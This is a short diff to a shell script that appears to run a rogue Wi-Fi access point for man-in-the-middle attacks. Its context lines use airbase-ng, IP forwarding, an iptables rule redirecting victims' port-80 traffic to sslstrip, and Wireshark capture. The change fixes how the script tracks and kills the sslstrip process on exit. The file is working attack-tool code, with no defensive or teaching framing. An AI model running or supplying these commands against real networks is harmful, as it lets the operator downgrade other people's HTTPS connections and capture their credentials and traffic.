@@ -14,7 +14,10 @@ ctrlc(){
  iptables --flush
  echo 0 > /proc/sys/net/ipv4/ip_forward
  kill `pidof airbase-ng` >/dev/null
- kill `pidof python` >/dev/null
+ if [ -n "$PIDofsslstrip" ]
+ then
+  kill $PIDofsslstrip >/dev/null
+ fi
  airmon-ng stop mon0 >/dev/null
  /etc/init.d/dhcp3-server stop >/dev/null
  echo "***k bye"
@@ -44,6 +47,7 @@ case "$2" in
   echo "***setting up sslstrip"
   iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
   python /pentest/web/sslstrip/sslstrip.py & >/dev/null
+  PIDofsslstrip=$!
   sleep 5
   echo "***starting wireshark for you"
   /usr/local/bin/wireshark & >/dev/null
